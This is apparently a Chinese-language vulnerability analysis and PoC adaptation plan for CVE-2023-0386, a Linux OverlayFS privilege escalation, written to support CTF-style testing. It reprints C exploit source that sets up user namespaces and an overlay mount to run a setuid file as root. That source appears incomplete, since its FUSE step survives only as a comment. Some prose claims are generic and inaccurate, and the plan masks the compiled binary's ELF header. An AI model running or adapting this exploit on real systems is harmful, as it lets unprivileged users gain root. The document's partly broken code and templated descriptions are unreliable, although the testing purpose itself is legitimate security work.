# CVE-2023-0386 漏洞技术分析与PoC改造计划

## 漏洞概述

| 属性 | 值 |
|------|-----|
| CVE ID | CVE-2023-0386 |
| CVSS | 7.8 |
| 严重等级 | HIGH |
| 漏洞类型 | Capability Bypass |
| 影响内核版本 | 5.x ~ 6.2.x |
| 利用技术 | OverlayFS文件系统与capability系统交互缺陷 |

## 原始PoC分析

### 参考来源
- **PoC URL**: https://github.com/xkaneiki/CVE-2023-0386/blob/main/exp.c
- **来源类型**: GitHub

### 利用原理
OverlayFS在处理setuid文件时未正确检查capability，允许通过构造overlay层结构获得非授权setuid文件执行权限。

该漏洞的触发条件为OverlayFS setuid文件capability检查缺失。攻击者通过精心构造的系统调用序列，利用Capability Bypass类型的缺陷，在内核空间中实现代码执行或数据篡改。

利用过程中，关键的内存操作为通过overlay层构造绕过capability检查。最终的提权路径通过获得非授权setuid文件执行实现提权完成，使非特权用户获得root权限。

### 关键技术点
1. OverlayFS setuid文件capability检查缺失
2. 通过overlay层构造绕过capability检查
3. 获得非授权setuid文件执行实现提权

## PoC改造计划

### CTF挑战模式适配
- **推荐测试模式**: write_root_file
- **模式选择理由**: 漏洞利用链可直接覆写文件内容，适合通过写入CTF标志验证

### CLI参数规范化
PoC需支持以下标准CLI参数：
- `--mode`: 测试模式 (read_root_file/write_root_file)
- `--root-file`: root权限目标文件路径
- `--write-value`: write模式的写入值 (ctf{...})
- `--log-file`: syscall日志文件路径
- `--verbose`: 详细输出开关

### 输出协议
CTF协议输出：
```
CTF_FLAG:<value>           // 挑战成功
CTF_FAIL:<reason>          // 漏洞未触发
CTF_UNSUPPORTED:<mode>:<reason> // 不支持的模式
```

### 三阶段验证集成
- **Phase 1 (Prepare)**: 创建FUSE文件系统和overlay工作目录
- **Phase 2 (Run)**: 通过overlay+FUSE绕过capability检查执行setuid文件
- **Phase 3 (Post)**: 验证提权结果、卸载文件系统、清理临时目录

### Syscall日志记录
关键syscall需要记录到log-file：
- `mount`
- `unshare`
- `execve`
- `fuse_mount`

## 改造要点

### 核心修改
1. 改造overlay利用为CTF验证
2. 添加CLI参数解析
3. 添加FUSE/overlay卸载清理

### 安全约束
- 执行超时: 30秒
- 禁止 rm -rf
- 禁止写 /etc
- 执行后清理临时ELF

### 编译要求
- 编译器: gcc
- 目标架构: x86_64
- 静态链接: 推荐 `-static`
- ELF掩蔽: 编译后前4字节替换为 `CVE\x00`

## Original PoC Source Code

Source: https://github.com/xkaneiki/CVE-2023-0386/blob/main/exp.c

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/capability.h>
// #include <attr/xattr.h>
// #include <sys/xattr.h>
int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
#define DIR_BASE "./ovlcap"
#define DIR_WORK DIR_BASE "/work"
#define DIR_LOWER DIR_BASE "/lower"
#define DIR_UPPER DIR_BASE "/upper"
#define DIR_MERGE DIR_BASE "/merge"
#define BIN_MERGE DIR_MERGE "/magic"
#define BIN_UPPER DIR_UPPER "/magic"
static void xmkdir(const char *path, mode_t mode)
{
    if (mkdir(path, mode) == -1 && errno != EEXIST)
        err(1, "mkdir %s", path);
}
static void xwritefile(const char *path, const char *data)
{
    int fd = open(path, O_WRONLY);
    if (fd == -1)
        err(1, "open %s", path);
    ssize_t len = (ssize_t)strlen(data);
    if (write(fd, data, len) != len)
        err(1, "write %s", path);
    close(fd);
}

static void xreadfile(const char *path)
{
    int fd = open(path, O_RDONLY);
    if (fd == -1)
        err(1, "open %s", path);
    int len = 0;
    char data[0x100];
    while (read(fd, data + len, 1) > 0)
    {
        len++;
    }
    data[len] = '\0';
    puts(data);
    printf("len %d\n", len);
    close(fd);
}

void listCaps()
{
    cap_t caps = cap_get_proc();
    ssize_t y = 0;
    printf("The process %d was give capabilities %s\n", (int)getpid(), cap_to_text(caps, &y));
    fflush(0);
    cap_free(caps);
}

static int exploit()
{
    // init work;
    char buf[4096];
    sprintf(buf, "rm -rf '%s/*'", DIR_UPPER);
    system(buf);
    xmkdir(DIR_BASE, 0777);
    xmkdir(DIR_WORK, 0777);
    xmkdir(DIR_LOWER, 0777);
    xmkdir(DIR_UPPER, 0777);
    xmkdir(DIR_MERGE, 0777);
    // mount overlay
    uid_t uid = getuid();
    gid_t gid = getgid();
    printf("uid:%d gid:%d\n", uid, gid);
    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
        err(1, "unshare");
    xwritefile("/proc/self/setgroups", "deny");
    sprintf(buf, "0 %d 1", uid);
    xwritefile("/proc/self/uid_map", buf);
    sprintf(buf, "0 %d 1", gid);
    xwritefile("/proc/self/gid_map", buf);

    sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);
    if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)
        err(1, "mount %s", DIR_MERGE);
    else
        puts("[+] mount success");

    sprintf(buf, "ls -la %s", DIR_MERGE);
    system(buf);
    sprintf(buf, "%s/file", DIR_MERGE);
    int fd = open(buf, O_WRONLY | O_CREAT, 0666); // touch file
    if (fd < 0)
        perror("open");
    close(fd);

    // close fuse
    // kill(pid, SIGINT);
    return 0;
}
int main(int argc, char *argv[])
{
    int pid = fork();
    int stat;
    if (pid == 0)
    {
        exploit();
        exit(0);
    }
    wait(&stat);
    // get shell
    puts("[+] exploit success!");
    char buf[0x100];
    sprintf(buf, "%s/file", DIR_UPPER);
    system(buf);
    return 0;
}
```

